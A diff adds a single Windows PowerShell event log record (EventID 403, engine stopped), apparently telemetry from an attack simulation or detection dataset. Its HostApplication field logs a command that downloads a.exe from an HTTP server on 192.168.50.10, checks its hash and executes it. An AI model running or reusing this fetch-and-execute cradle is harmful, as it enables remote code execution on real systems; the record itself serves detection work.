@@ -1,0 +1,17 @@
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='PowerShell'/><EventID Qualifiers='0'>403</EventID><Level>4</Level><Task>4</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2026-09-15T01:53:28.4121079Z'/><EventRecordID>50</EventRecordID><Channel>Windows PowerShell</Channel><Computer>DESKTOP-IS00QJN.corp.local</Computer><Security/></System><EventData><Data>Stopped</Data><Data>Available</Data><Data>	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.15063.0
+	HostId=de567031-f67f-43d9-9633-d7b2782c2666
+	HostApplication=C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe -nop -c $p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'ca7376fb8a63573c3ae02147e6105bce76c091bc7d39c6f2d449bbe9b69e5fc8'){&amp;$p}else{ri $p -Force}
+	EngineVersion=5.1.15063.0
+	RunspaceId=c0f74686-2d6b-4603-9b03-a6f9c84e43af
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data></EventData></Event>
